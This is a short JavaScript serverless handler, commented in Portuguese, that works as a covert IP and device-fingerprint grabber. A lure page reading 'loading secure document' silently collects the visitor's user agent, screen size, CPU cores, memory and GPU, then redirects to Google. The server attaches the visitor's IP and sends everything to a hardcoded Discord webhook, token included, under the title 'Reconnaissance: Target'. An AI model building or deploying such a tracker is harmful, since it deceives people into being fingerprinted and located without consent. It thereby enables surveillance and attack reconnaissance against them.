export default async function handler(req, res) {
    const webhookURL = "https://discord.com/api/webhooks/1457145338161926276/zls4e-KmVOQwMrWLs_Ut-QR5N2R0mhpfKfw4BhVqUJOL-8mzELAZHk13rbJPlH4geFuv";

    // Se for a requisição final com os dados de hardware
    if (req.method === 'POST') {
        const data = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        const payload = {
            embeds: [{
                title: " Reconhecimento: Alvo ",
                color: 15158332,
                fields: [
                    { name: " IP", value: ip, inline: true },
                    { name: " OS/Browser", value: data.ua },
                    { name: " GPU", value: data.gpu || "N/A", inline: true },
                    { name: " RAM", value: `${data.mem} GB`, inline: true },
                    { name: " CPU Cores", value: `${data.cores}`, inline: true },
                    { name: " Resolução", value: data.res, inline: true }
                ],
                footer: { text: "Data: " + new Date().toLocaleString() }
            }]
        };

        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        return res.status(200).json({ status: 'ok' });
    }

    // Página inicial que o alvo abre (Coleta Silenciosa)
    res.setHeader('Content-Type', 'text/html');
    res.send(`
        <script>
            const getGPU = () => {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
            };

            const data = {
                ua: navigator.userAgent,
                res: \`\${screen.width}x\${screen.height}\`,
                cores: navigator.hardwareConcurrency,
                mem: navigator.deviceMemory || "N/A",
                gpu: getGPU()
            };

            fetch('/api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).finally(() => {
                // Redirecionamento instantâneo para o site real
                window.location.href = "https://www.google.com";
            });
        </script>
        <p>Carregando documento seguro...</p>
    `);
}
